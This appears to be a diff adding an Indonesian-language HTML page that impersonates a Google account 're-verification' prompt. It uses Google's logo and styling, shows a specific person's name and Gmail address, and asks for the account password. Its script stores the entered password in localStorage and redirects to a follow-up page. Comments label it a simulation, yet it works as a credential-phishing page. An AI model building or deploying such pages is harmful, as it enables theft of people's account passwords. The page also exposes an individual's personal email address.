@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Verifikasi Ulang Akun Google</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
+
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: #fff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: #202124;
+    }
+    .container {
+      width: 400px;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      padding: 40px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.12);
+      text-align: center;
+    }
+    .logo img {
+      width: 75px;
+      margin-bottom: 30px;
+    }
+    .profile {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+    .profile img {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      object-fit: cover;
+    }
+    .profile-details {
+      text-align: left;
+    }
+    .profile-details .name {
+      font-size: 14px;
+      font-weight: 500;
+    }
+    .profile-details .email {
+      font-size: 13px;
+      color: #5f6368;
+    }
+    h1 {
+      font-size: 22px;
+      font-weight: 400;
+      margin-bottom: 10px;
+    }
+    p {
+      font-size: 14px;
+      color: #5f6368;
+      margin-bottom: 30px;
+    }
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      margin-bottom: 20px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      background-color: #1a73e8;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #155ab6;
+    }
+    .footer {
+      margin-top: 30px;
+      font-size: 12px;
+      color: #80868b;
+    }
+    .footer a {
+      color: #1a73e8;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" role="main">
+    <div class="logo">
+      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Logo Google">
+    </div>
+
+    <div class="profile">
+      <img src="img/foto.jpg" alt="Foto Profil">
+      <div class="profile-details">
+        <div class="name">C. Nias</div>
+        <div class="email">celsinias20@gmail.com</div>
+      </div>
+    </div>
+
+    <h1>Verifikasi Ulang Diperlukan</h1>
+    <p>Demi keamanan akun Anda, mohon masukkan kembali sandi akun Google Anda untuk memverifikasi identitas Anda.</p>
+
+    <!-- Input & Tombol (tanpa form) -->
+    <div>
+      <input type="password" id="password" placeholder="Masukkan sandi Anda" required>
+      <button type="submit" id="submitBtn">Berikutnya</button>
+    </div>
+
+    <div class="footer">
+      <p>Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043</p>
+      <p><a href="https://support.google.com/accounts" target="_blank">Pusat Bantuan Google</a></p>
+    </div>
+  </div>
+
+  <script>
+  document.getElementById('submitBtn').addEventListener('click', function () {
+    const password = document.getElementById('password').value;
+    
+    // Optional: kalau Anda juga ingin simulasikan username
+    const username = "celsinias20@gmail.com"; // atau ambil dari elemen lain jika tersedia
+
+    if (!password) {
+      alert("Silakan masukkan kata sandi.");
+      return;
+    }
+
+    // Simpan data ke localStorage (untuk simulasi saja, bukan nyata)
+    localStorage.setItem('savedUsername', username);
+    localStorage.setItem('savedPassword', password);
+
+    // Redirect ke halaman simulasi konfirmasi
+    window.location.href = 'submit-verification.html';
+  });
+</script>
+
+</body>
+</html>
